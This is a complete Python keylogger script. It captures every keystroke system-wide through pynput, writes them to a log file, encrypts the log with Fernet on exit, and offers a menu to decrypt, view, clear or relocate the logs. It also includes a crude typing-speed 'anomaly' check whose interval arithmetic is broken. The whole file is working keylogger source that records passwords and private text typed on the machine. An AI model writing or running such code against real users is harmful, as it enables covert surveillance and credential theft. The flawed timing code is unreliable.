import os
import time
from pynput import keyboard
from cryptography.fernet import Fernet
from dotenv import load_dotenv
from collections import Counter
import sys

# Load environment variables from .env file
load_dotenv()

# Specify the default paths to the log file and the encrypted file
LOG_FILE = os.getenv('log_file')
ENCRYPT_FILE = os.getenv('encrypted_file')
key_file = 'key.key'

# Variables for anomaly detection
key_press_times = []
char_frequency = Counter()

# Generate an encryption key and save it to a file
def generate_key():
    key = Fernet.generate_key()
    with open(key_file, 'wb') as key_out:
        key_out.write(key)
    print(f"New encryption key generated and saved to '{key_file}'.")

# Load the encryption key or generate one if it doesn't exist
def load_key():
    if not os.path.exists(key_file):
        print(f"Key file '{key_file}' not found. Generating a new key.")
        generate_key()  # Automatically generate a key if missing
    return open(key_file, "rb").read()

# Encrypt the log file
def encrypt_log_file():
    key = load_key()
    cipher_suite = Fernet(key)
    if not os.path.exists(LOG_FILE):
        print(f"Log file '{LOG_FILE}' not found.")
        return
    with open(LOG_FILE, 'rb') as file:
        log_data = file.read()
    encrypted_data = cipher_suite.encrypt(log_data)
    with open(ENCRYPT_FILE, 'wb') as file:
        file.write(encrypted_data)
    os.remove(LOG_FILE)  # Remove the plain log file after encryption
    print(f"Log file encrypted and saved as '{ENCRYPT_FILE}'.")

# Decrypt the log file
def decrypt_log_file():
    key = load_key()
    cipher_suite = Fernet(key)
    if not os.path.exists(ENCRYPT_FILE):
        print(f"Encrypted file '{ENCRYPT_FILE}' not found.")
        return
    with open(ENCRYPT_FILE, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    with open(LOG_FILE, 'wb') as file:
        file.write(decrypted_data)
    print(f"Encrypted file decrypted and saved as '{LOG_FILE}'.")

# Detect anomalies based on typing speed and character frequency
def detect_anomalies():
    if len(key_press_times) > 2:
        avg_interval = sum(key_press_times) / len(key_press_times)
        if avg_interval < 0.05:
            print("Anomaly detected: Typing too fast!")
    
    most_common_char, count = char_frequency.most_common(1)[0]
    if count > 100:
        print(f"Anomaly detected: Unusual frequency of character '{most_common_char}'")

# This function is called every time a key is pressed
def on_press(key):
    try:
        current_time = time.time()
        if len(key_press_times) > 0:
            key_press_times.append(current_time - key_press_times[-1])
        else:
            key_press_times.append(current_time)
        
        with open(LOG_FILE, 'a') as f:
            f.write(key.char)
        
        char_frequency[key.char] += 1

    except AttributeError:
        with open(LOG_FILE, 'a') as f:
            if key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.tab:
                f.write('\t')
            else:
                f.write(f'[{key}]')
    
    detect_anomalies()

def on_release(key):
    if key == keyboard.Key.esc:
        # Encrypt the log file on exit
        encrypt_log_file()
        return False

# Start the keylogger
def start_logging():
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# View the log file contents (only if decrypted)
def view_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as file:
            print("Log File Content:")
            print(file.read())
    else:
        print(f"Log file '{LOG_FILE}' does not exist or is encrypted. Decrypt the logs first.")

# Clear the log file
def clear_logs():
    if os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w').close()
        print(f"Log file '{LOG_FILE}' has been cleared.")
    else:
        print(f"Log file '{LOG_FILE}' does not exist or is encrypted.")

# Change the file paths for logging and encryption
def configure_files():
    global LOG_FILE, ENCRYPT_FILE
    LOG_FILE = input("Enter the new log file path: ")
    ENCRYPT_FILE = input("Enter the new encrypted file path: ")
    print(f"Log file set to: {LOG_FILE}")
    print(f"Encrypted file set to: {ENCRYPT_FILE}")

# Simple expanded CLI for user interface
def main():
    while True:
        print("\nKeylogger Menu:")
        print("1. Start logging")
        print("2. Decrypt logs")
        print("3. View logs (must decrypt first)")
        print("4. Clear logs")
        print("5. Configure file paths")
        print("6. Exit")
        
        choice = input("Enter your choice: ")

        if choice == "1":
            start_logging()
        elif choice == "2":
            decrypt_log_file()
        elif choice == "3":
            view_logs()
        elif choice == "4":
            clear_logs()
        elif choice == "5":
            configure_files()
        elif choice == "6":
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
